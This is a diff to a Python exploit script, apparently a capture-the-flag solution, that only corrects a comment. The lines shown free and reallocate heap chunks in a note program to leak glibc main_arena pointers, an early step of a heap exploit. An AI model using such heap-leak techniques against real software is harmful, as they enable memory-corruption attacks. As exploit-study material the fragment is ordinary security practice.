@@ -102,7 +102,7 @@ if __name__ == "__main__":
     new_note(p32(0xdeadbeef)) # alloc two chunks and delete the first one
     new_note(p32(0xdeadbeef))
 
-    delete_note(0) # glibc malloc manager will write fd/bk pointer into the chunk which point somewhere in libc area
+    delete_note(0) # glibc malloc manager will write fd/bk pointers into the chunk which point somewhere in libc area
 
     new_note('C'*8) # overwrite fd pointer and still we have bk pointer to <main_arena>
     
